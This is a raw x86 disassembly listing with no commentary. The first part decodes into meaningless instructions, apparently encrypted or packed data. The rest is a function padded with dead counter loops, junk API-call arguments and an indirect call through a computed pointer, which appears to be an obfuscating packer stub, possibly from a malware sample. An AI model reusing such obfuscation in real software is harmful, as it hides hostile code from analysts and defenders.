  414a60:	std    
  414a61:	outs   dx,BYTE PTR ds:[esi]
  414a62:	xor    eax,0x7f336d56
  414a67:	inc    esp
  414a68:	int    0x56
  414a6a:	xor    eax,0xcfa0d47
  414a6f:	mov    ds:0xd1bafa3d,al
  414a74:	adc    BYTE PTR [eax],dh
  414a76:	jl     0x414a62
  414a78:	call   0x2951:0xe22fee2
  414a7f:	dec    BYTE PTR [esi-0x704bda53]
  414a85:	pop    edi
  414a86:	sbb    al,0xd6
  414a88:	sub    DWORD PTR [ebp+0x7f11a204],ebx
  414a8e:	jno    0x414abf
  414a90:	sub    al,0x21
  414a92:	xchg   esp,eax
  414a93:	cld    
  414a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a95:	ror    eax,1
  414a97:	bound  ecx,QWORD PTR [edx]
  414a99:	mov    bh,0xc
  414a9b:	push   edi
  414a9c:	dec    eax
  414a9d:	pop    es
  414a9e:	xchg   esp,eax
  414a9f:	or     eax,0xbdf1dc6
  414aa4:	push   0xffffff9e
  414aa6:	adc    al,0x20
  414aa8:	cmp    bl,BYTE PTR [edi-0x1c]
  414aab:	in     al,dx
  414aac:	das    
  414aad:	and    DWORD PTR [edx+esi*8+0x3b],ebp
  414ab1:	(bad)  [ebp+0x60]
  414ab4:	dec    eax
  414ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab6:	and    DWORD PTR [edx],edx
  414ab8:	aas    
  414ab9:	dec    eax
  414aba:	mov    cl,0x1e
  414abc:	add    BYTE PTR [edx+ebx*2],0x12
  414ac0:	jns    0x414b04
  414ac2:	sbb    al,0x8a
  414ac4:	pop    ds
  414ac5:	adc    ecx,DWORD PTR [ebp-0x4e]
  414ac8:	fwait
  414ac9:	int    0xa9
  414acb:	daa    
  414acc:	out    0x5f,eax
  414ace:	inc    ebp
  414acf:	or     al,0x19
  414ad1:	sbb    ch,ah
  414ad3:	dec    edx
  414ad4:	das    
  414ad5:	(bad)  [ebp-0x63]
  414ad8:	mov    eax,0x6e0b342d
  414add:	popa   
  414ade:	jo     0x414ad2
  414ae0:	lods   al,BYTE PTR ds:[esi]
  414ae1:	adc    al,0x20
  414ae3:	adc    DWORD PTR [ebx],ecx
  414ae5:	ret    
  414ae6:	sbb    DWORD PTR [eax-0xc],eax
  414ae9:	mov    eax,0x4bdca66b
  414aee:	xchg   esi,eax
  414aef:	cmp    al,BYTE PTR [esi+0x348f0796]
  414af5:	and    BYTE PTR [ebp+0x5c],0x5
  414af9:	ret    
  414afa:	mov    eax,0x358d83d9
  414aff:	xchg   BYTE PTR [ecx],ah
  414b01:	mov    dl,0x6c
  414b03:	or     ch,al
  414b05:	test   DWORD PTR [eax-0x275883e2],esi
  414b0b:	int3   
  414b0c:	addps  xmm3,xmm0
  414b0f:	inc    ebx
  414b10:	in     eax,0x25
  414b12:	cmp    DWORD PTR [edi-0x4cdaa7dc],ebp
  414b18:	dec    edx
  414b19:	imul   ecx,DWORD PTR [eax+esi*1-0x2237b3c1],0x9
  414b21:	ror    DWORD PTR [edi],cl
  414b23:	fidivr DWORD PTR [ecx+0x285d55]
  414b29:	mov    bl,0x20
  414b2b:	sub    ebp,DWORD PTR [esp+ebx*4+0x7e8c6242]
  414b32:	lods   eax,DWORD PTR ds:[esi]
  414b33:	div    DWORD PTR [edx+0x4771fb06]
  414b39:	push   edx
  414b3b:	mov    esp,0x967a64fd
  414b40:	call   0x8d60eeb2
  414b45:	mov    dl,0xc1
  414b47:	pop    es
  414b48:	push   ds
  414b49:	mov    al,ds:0xe7b1c8df
  414b4e:	add    bh,al
  414b50:	fdiv   QWORD PTR [edi+0x67fae536]
  414b56:	add    ebp,DWORD PTR [eax-0x342ad44e]
  414b5c:	ffree  st(4)
  414b5e:	call   0x54d69585
  414b63:	pop    edx
  414b64:	mov    bh,0xd4
  414b66:	je     0x414b32
  414b68:	inc    esi
  414b69:	mov    esi,0x97d295c6
  414b6e:	les    ecx,FWORD PTR [esi]
  414b70:	sbb    ebx,edi
  414b72:	addr16 (bad) 
  414b74:	cmp    al,0x94
  414b76:	sbb    al,0x55
  414b78:	cmp    ah,BYTE PTR [esi+0x71c17045]
  414b7e:	mov    cl,0x2
  414b80:	in     eax,0x40
  414b82:	sar    DWORD PTR [edx+0xac91a20],1
  414b88:	sbb    eax,0xfdf9a44d
  414b8d:	stc    
  414b8e:	mov    cl,0xc1
  414b90:	fcom   DWORD PTR [eax+0x3d]
  414b93:	cmp    al,0x77
  414b95:	jmp    0x4117ec2
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	sbb    cl,cl
  414bb3:	add    cl,BYTE PTR [eax-0x80]
  414bb6:	adc    bh,BYTE PTR [edi+0x78]
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	or     BYTE PTR [esi],dh
  414bbf:	mov    BYTE PTR [esi-0x5909e1a],bl
  414bc5:	cld    
  414bc6:	dec    eax
  414bc7:	mov    BYTE PTR [edi-0x69],ch
  414bca:	xor    BYTE PTR [edx-0x2141723d],dh
  414bd0:	add    BYTE PTR [edi],dh
  414bd2:	xchg   ebx,eax
  414bd3:	mov    edi,0x92fc3afb
  414bd8:	add    DWORD PTR [edx+0x5ef13f5d],esp
  414bde:	dec    edx
  414bdf:	and    DWORD PTR [esp+ebx*4+0x38beccf7],ecx
  414be6:	adc    BYTE PTR [bx+di+0x24],0x1c
  414beb:	call   0xe0f579d0
  414bf0:	scas   eax,DWORD PTR es:[edi]
  414bf1:	xor    DWORD PTR [ecx-0x1f],eax
  414bf4:	or     ecx,DWORD PTR [esi-0x193c87d0]
  414bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bfb:	call   0x82b3:0xf02c7944
  414c02:	fsub   st,st(5)
  414c04:	mov    ebp,0xb73f72ec
  414c09:	sbb    ebx,esi
  414c0b:	cwde   
  414c0c:	mov    DWORD PTR [ecx+0x5952d774],edx
  414c12:	mov    ebx,0x76c8f378
  414c17:	pop    edi
  414c18:	int3   
  414c19:	ret    0xe703
  414c1c:	add    DWORD PTR [ecx],edi
  414c1e:	and    DWORD PTR [esi+0x789536e5],0xffffffa3
  414c25:	lock in al,dx
  414c27:	mov    ds:0xea456869,eax
  414c2c:	dec    ebp
  414c2d:	add    dh,ch
  414c2f:	aad    0x3e
  414c31:	jnp    0x414c79
  414c33:	mov    edx,0x2067f58e
  414c38:	std    
  414c39:	xlat   BYTE PTR ds:[ebx]
  414c3a:	mov    dl,BYTE PTR [edx]
  414c3c:	pop    ecx
  414c3d:	sub    eax,0x6c80a8aa
  414c42:	sub    al,0x75
  414c44:	mov    ds:0xba35d3f3,al
  414c49:	mov    ds:0xb48102ce,eax
  414c4e:	xchg   esp,eax
  414c4f:	pop    ds
  414c50:	test   DWORD PTR [ecx],ecx
  414c52:	add    bh,bh
  414c54:	rol    edx,0x68
  414c57:	mov    dl,0xf
  414c59:	or     dh,BYTE PTR [eax+0x440a99ed]
  414c5f:	(bad)  [edi]
  414c61:	sbb    edi,DWORD PTR [ebx]
  414c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c64:	fnsave [edx]
  414c66:	pop    ecx
  414c67:	xchg   esp,eax
  414c68:	sub    dh,0xb9
  414c6b:	mov    edx,0xb0ee0a83
  414c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c71:	or     dh,BYTE PTR [eax-0x20eb08e4]
  414c77:	inc    edx
  414c78:	les    esi,FWORD PTR [ebx-0x53e3cc9e]
  414c7e:	imul   esi,DWORD PTR [edi+ebx*8-0x4211b78b],0xae68411
  414c89:	lods   al,BYTE PTR ds:[esi]
  414c8a:	and    BYTE PTR [ecx-0x8],dh
  414c8d:	sbb    DWORD PTR fs:[edx],edi
  414c90:	aad    0x54
  414c92:	jne    0x414cc2
  414c94:	push   ebp
  414c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c96:	sub    BYTE PTR [esi+0x506eaa42],al
  414c9c:	idiv   dl
  414c9e:	push   esp
  414c9f:	push   ss
  414ca0:	sti    
  414ca1:	test   eax,0x2701b529
  414ca6:	outs   dx,BYTE PTR ds:[esi]
  414ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca8:	jge    0x414cbd
  414caa:	inc    DWORD PTR [ebp+0x40]
  414cad:	pop    ecx
  414cae:	mov    WORD PTR [edx+ebp*8+0x59],ds
  414cb2:	xchg   edi,eax
  414cb3:	inc    ebp
  414cb4:	jns    0x414d02
  414cb6:	enter  0x31ae,0xa1
  414cba:	xchg   edi,eax
  414cbb:	gs icebp 
  414cbd:	adc    BYTE PTR [ebp+0x41616b12],cl
  414cc3:	std    
  414cc4:	div    DWORD PTR [ecx+0x34]
  414cc7:	or     al,0x47
  414cc9:	scas   eax,DWORD PTR es:[edi]
  414cca:	pop    ecx
  414ccb:	ret    
  414ccc:	pop    edx
  414ccd:	jmp    0xda56ff83
  414cd2:	inc    ebp
  414cd3:	pop    edx
  414cd4:	or     ch,al
  414cd6:	(bad)  
  414cd8:	add    BYTE PTR [edx],bl
  414cda:	std    
  414cdb:	mov    eax,0xa0891be5
  414ce0:	adc    dl,bl
  414ce2:	mov    DWORD PTR [ebx+0x3571719],ebx
  414ce8:	or     esi,ebp
  414cea:	test   BYTE PTR [eax+0x69],ah
  414ced:	dec    ecx
  414cee:	cmp    BYTE PTR [edi+0x1bab7439],0x89
  414cf5:	inc    edi
  414cf6:	push   DWORD PTR [edx-0x42]
  414cf9:	in     al,dx
  414cfa:	mov    ds:0xd06d156b,eax
  414cff:	lods   eax,DWORD PTR ds:[esi]
  414d00:	and    al,0x4d
  414d02:	adc    dl,BYTE PTR [edx-0x46]
  414d05:	xchg   esi,eax
  414d06:	xor    bh,cl
  414d08:	add    BYTE PTR [edx-0x76769d5],al
  414d0e:	rcr    edi,1
  414d10:	inc    edi
  414d11:	mov    esi,0xceed5682
  414d16:	xor    eax,0xa8b3928e
  414d1b:	add    BYTE PTR [eax-0xf],al
  414d1e:	data16 sub BYTE PTR cs:[ecx+0x75],ah
  414d23:	mov    ebp,0x81ea6f70
  414d28:	ss mov dh,0xa0
  414d2b:	dec    ebx
  414d2c:	and    al,0xd4
  414d2e:	adc    eax,0x74796f4d
  414d33:	loop   0x414d51
  414d35:	pop    edi
  414d36:	sar    DWORD PTR [edi-0x79],0xb1
  414d3a:	out    0x28,al
  414d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d3d:	pop    ds
  414d3e:	add    ah,BYTE PTR [edi+0x2e]
  414d41:	pop    edx
  414d42:	pop    eax
  414d43:	adc    al,0xc9
  414d45:	scas   eax,DWORD PTR es:[edi]
  414d46:	sbb    ebx,esi
  414d48:	dec    ebx
  414d49:	lods   eax,DWORD PTR ds:[esi]
  414d4a:	mov    DWORD PTR [edi+0x51],ebx
  414d4d:	mov    cl,0xa3
  414d4f:	iret   
  414d50:	push   esp
  414d51:	outs   dx,DWORD PTR ds:[esi]
  414d52:	xor    eax,0x169f5dd5
  414d57:	(bad)  
  414d58:	xor    al,0xc7
  414d5a:	rol    BYTE PTR [ebx+0x28d008ca],cl
  414d60:	les    edi,FWORD PTR [ebx]
  414d62:	xchg   edx,eax
  414d63:	fild   QWORD PTR [ebp+0x4b05bdb4]
  414d69:	mov    al,ds:0x15edaf32
  414d6e:	ret    0x9229
  414d71:	hlt    
  414d72:	adc    eax,0x437b821
  414d77:	or     BYTE PTR [ebp-0x55e0e016],dh
  414d7d:	adc    DWORD PTR [eax-0x319727df],ebx
  414d83:	dec    ebp
  414d84:	je     0x414dfd
  414d86:	xchg   ebp,eax
  414d87:	jo     0x414d7a
  414d89:	inc    esi
  414d8a:	ret    
  414d8b:	or     al,0xe4
  414d8d:	and    al,0xc5
  414d8f:	fsubp  st(1),st
  414d91:	cwde   
  414d92:	mov    edi,DWORD PTR ds:0x30538690
  414d98:	xchg   edx,eax
  414d99:	out    dx,al
  414d9a:	js     0x414de1
  414d9c:	cmp    eax,0x4b0f4343
  414da1:	xor    eax,0xe1b02b5b
  414da6:	jo     0x414dc7
  414da8:	sahf   
  414da9:	into   
  414daa:	push   0xffffff8d
  414dac:	out    dx,eax
  414dad:	js     0x414d65
  414daf:	stos   BYTE PTR es:[edi],al
  414db0:	mov    ds:0xccdc335e,eax
  414db5:	jbe    0x414d61
  414db7:	push   ebx
  414db8:	dec    eax
  414db9:	clc    
  414dba:	mov    edx,0xdc124601
  414dbf:	das    
  414dc0:	ds xchg ebp,eax
  414dc2:	add    BYTE PTR [eax-0x79],bl
  414dc5:	add    ecx,eax
  414dc7:	jno    0x414e13
  414dc9:	jl     0x414e2d
  414dcb:	mov    dh,0x78
  414dcd:	cmp    al,bl
  414dcf:	add    dl,BYTE PTR [eax-0x3a]
  414dd2:	jecxz  0x414d92
  414dd4:	loop   0x414da1
  414dd6:	test   DWORD PTR [ebx-0x1ee57d18],ebx
  414ddc:	rol    BYTE PTR [edx+0x78],cl
  414ddf:	add    al,0xd1
  414de1:	jne    0x414da9
  414de3:	push   esp
  414de4:	push   ds
  414de5:	inc    eax
  414de6:	out    0x33,al
  414de8:	out    dx,al
  414de9:	sub    BYTE PTR [ebp+edx*1-0x53],0xfd
  414dee:	dec    esp
  414def:	jmp    0x414df3
  414df1:	icebp  
  414df2:	mov    ds:0x9a267c02,eax
  414df7:	fisttp WORD PTR [edi+0x2f1a7aa5]
  414dfd:	dec    ebp
  414dfe:	mov    esi,0xb0c60274
  414e03:	test   al,0x5f
  414e05:	(bad)  
  414e06:	xor    dl,BYTE PTR [ebx+0x64]
  414e09:	jge    0x414e88
  414e0b:	xlat   BYTE PTR ds:[ebx]
  414e0c:	jmp    0x414e30
  414e0e:	cmp    DWORD PTR [esi+0x1e],0xffffff8c
  414e12:	push   ebp
  414e13:	and    cl,BYTE PTR [ebx]
  414e15:	fcom   DWORD PTR [ebx+0x5d]
  414e18:	shl    esp,cl
  414e1a:	adc    DWORD PTR [ebp+0x5e],ecx
  414e1d:	xchg   DWORD PTR [ebx],ebx
  414e1f:	nop
  414e20:	hlt    
  414e21:	add    BYTE PTR [edi-0x1f7a1ac4],dl
  414e27:	or     BYTE PTR [edi],0x86
  414e2a:	data16 lods al,BYTE PTR ds:[esi]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
